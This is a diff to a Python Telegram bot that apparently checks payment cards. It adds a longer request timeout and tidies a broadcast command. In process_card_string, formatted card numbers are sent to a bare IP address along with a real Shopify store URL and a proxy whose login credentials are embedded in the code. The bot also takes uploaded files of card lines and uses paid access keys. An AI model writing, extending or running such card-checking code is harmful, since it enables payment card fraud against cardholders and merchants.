@@ -25,7 +25,7 @@ SUB_ADMINS = set()
 BANNED_USERS = set()
 ACTIVE_KEYS = {} 
 USER_SUBSCRIPTIONS = {}
-ALL_USERS = set()  # Bot use karne wale sabhi unique users ko track karne ke liye
+ALL_USERS = set()
 
 def is_main_admin(user_id):
     return user_id in AUTHORIZED_ADMINS
@@ -90,7 +90,6 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     await update.message.reply_text(panel_message, parse_mode="Markdown")
 
-# /announcement command to broadcast message to all users
 async def announcement_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
@@ -113,8 +112,7 @@ async def announcement_command(update: Update, context: ContextTypes.DEFAULT_TYP
             await context.bot.send_message(chat_id=uid, text=broadcast_msg, parse_mode="Markdown")
             sent_count += 1
         except Exception:
-            fail_count.append(uid) if isinstance(fail_count, list) else None
-            fail_count = fail_count + 1 if not isinstance(fail_count, list) else fail_count
+            fail_count += 1
             
     await context.bot.edit_message_text(
         chat_id=update.effective_chat.id,
@@ -290,7 +288,8 @@ def process_card_string(card_line):
         
         api_url = f"http://216.250.119.63/?{quote(formatted_cc)}&url=https://customsbyarrillc.myshopify.com&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
         
-        response = requests.get(api_url, timeout=35)
+        # Timeout increased to 60 seconds
+        response = requests.get(api_url, timeout=60)
         res_data = response.json()
         
         resp_status = res_data.get("Response", "UNKNOWN")
@@ -409,9 +408,9 @@ def main():
     
     app.add_handler(MessageHandler(filters.Document.ALL, chf_document))
 
-    print("Bot is up and running with Announcement feature...")
+    print("Bot is up and running with 60s timeout...")
     app.run_polling()
 
 if __name__ == "__main__":
     main()
-        
+    
